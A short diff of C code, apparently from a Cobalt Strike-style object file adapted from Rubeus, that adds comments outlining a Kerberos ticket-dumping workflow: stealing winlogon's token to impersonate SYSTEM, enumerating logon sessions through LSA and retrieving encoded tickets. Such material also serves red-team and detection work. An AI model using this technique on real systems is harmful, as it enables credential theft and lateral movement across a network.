@@ -428,6 +428,8 @@ failed:
 }
 
 // returns true if the current process is running elevated (high integrity / admin)
+// impersonate SYSTEM → LsaRegisterLogonProcess →  get kerberos package ID LsaLookupAuthenticationPackage  → LsaEnumerateLogonSessions  → RevertToSelf() → EnablePrivilege(29) + EnablePrivilege(7) 
+// → KerbRetrieveTicketMessage with KERB_QUERY_TKT_CACHE_REQUEST → convert KERB_EXTERNAL_TICKET → LsaDeregisterLogonProcess
 BOOL IsHighIntegrity() {
     HANDLE hToken = NULL;
     if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken)) {
@@ -456,6 +458,8 @@ BOOL IsHighIntegrity() {
 // Impersonates NT AUTHORITY\SYSTEM by stealing winlogon's token.
 // Returns TRUE on success (call RevertToSelf afterwards via ADVAPI32$RevertToSelf).
 // Adapted from Rubeus' Helpers.GetSystem().
+// Impersonate SYSTEM via GetSystem() (steal winlogon's token) → calls LsaRegisterLogonProcess → get kerberos package ID LsaLookupAuthenticationPackage 
+// → LsaEnumerateLogonSessions → KerbQueryTicketCacheExMessage → KerbRetrieveEncodedTicketMessage with KERB_RETRIEVE_TICKET_AS_KERB_CRED to get ticket →  LsaDeregisterLogonProcess + RevertToSelf
 BOOL GetSystem() {
     if (!IsHighIntegrity())
         return FALSE;
